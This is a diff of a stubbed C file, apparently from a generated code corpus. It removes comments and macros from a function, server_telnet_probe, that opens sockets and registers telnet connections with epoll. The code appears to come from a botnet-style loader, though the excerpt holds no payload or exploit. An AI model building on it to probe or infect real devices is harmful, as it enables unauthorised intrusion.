@@ -1,43 +1,43 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_4__   TYPE_2__ ;
-typedef  struct TYPE_3__   TYPE_1__ ;
 
-/* Type definitions */
-struct telnet_info {int /*<<< orphan*/  port; int /*<<< orphan*/  addr; } ;
-struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
-struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
+
+
+typedef struct TYPE_4__ TYPE_2__ ;
+typedef struct TYPE_3__ TYPE_1__ ;
+
+
+struct telnet_info {int port; int addr; } ;
+struct TYPE_3__ {int s_addr; } ;
+struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
 struct sockaddr {int dummy; } ;
-struct server_worker {int /*<<< orphan*/  efd; } ;
-struct server {size_t workers_len; int max_open; struct connection** estab_conns; int /*<<< orphan*/  curr_open; int /*<<< orphan*/  curr_worker_child; struct server_worker* workers; } ;
+struct server_worker {int efd; } ;
+struct server {size_t workers_len; int max_open; struct connection** estab_conns; int curr_open; int curr_worker_child; struct server_worker* workers; } ;
 struct TYPE_4__ {int fd; } ;
-struct epoll_event {int /*<<< orphan*/  events; TYPE_2__ data; } ;
-struct connection {int fd; struct server* srv; int /*<<< orphan*/  info; } ;
+struct epoll_event {int events; TYPE_2__ data; } ;
+struct connection {int fd; struct server* srv; int info; } ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- int /*<<< orphan*/  ATOMIC_DEC (int /*<<< orphan*/ *) ; 
- size_t ATOMIC_INC (int /*<<< orphan*/ *) ; 
- scalar_t__ EINPROGRESS ; 
- int /*<<< orphan*/  EPOLLOUT ; 
- int /*<<< orphan*/  EPOLL_CTL_ADD ; 
- int connect (int,struct sockaddr*,int) ; 
- int /*<<< orphan*/  connection_close (struct connection*) ; 
- int /*<<< orphan*/  connection_open (struct connection*) ; 
- int /*<<< orphan*/  epoll_ctl (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,struct epoll_event*) ; 
- scalar_t__ errno ; 
- int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,struct telnet_info*,int) ; 
- int /*<<< orphan*/  printf (char*) ; 
- int time (int /*<<< orphan*/ *) ; 
- int util_socket_and_bind (struct server*) ; 
+
+ int AF_INET ;
+ int ATOMIC_DEC (int *) ;
+ size_t ATOMIC_INC (int *) ;
+ scalar_t__ EINPROGRESS ;
+ int EPOLLOUT ;
+ int EPOLL_CTL_ADD ;
+ int connect (int,struct sockaddr*,int) ;
+ int connection_close (struct connection*) ;
+ int connection_open (struct connection*) ;
+ int epoll_ctl (int ,int ,int,struct epoll_event*) ;
+ scalar_t__ errno ;
+ int memcpy (int *,struct telnet_info*,int) ;
+ int printf (char*) ;
+ int time (int *) ;
+ int util_socket_and_bind (struct server*) ;
 
 void server_telnet_probe(struct server *srv, struct telnet_info *info)
 {
@@ -50,7 +50,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
 
     if (fd == -1)
     {
-        if (time(NULL) % 10 == 0)
+        if (time(((void*)0)) % 10 == 0)
         {
             printf("Failed to open and bind socket\n");
         }
@@ -61,14 +61,14 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     {
         printf("fd too big\n");
         conn->fd = fd;
-#ifdef DEBUG
-        printf("Can't utilize socket because client buf is not large enough\n");
-#endif
+
+
+
         connection_close(conn);
         return;
     }
 
-    if (srv == NULL)
+    if (srv == ((void*)0))
         printf("srv == NULL 4\n");
 
     conn = srv->estab_conns[fd];
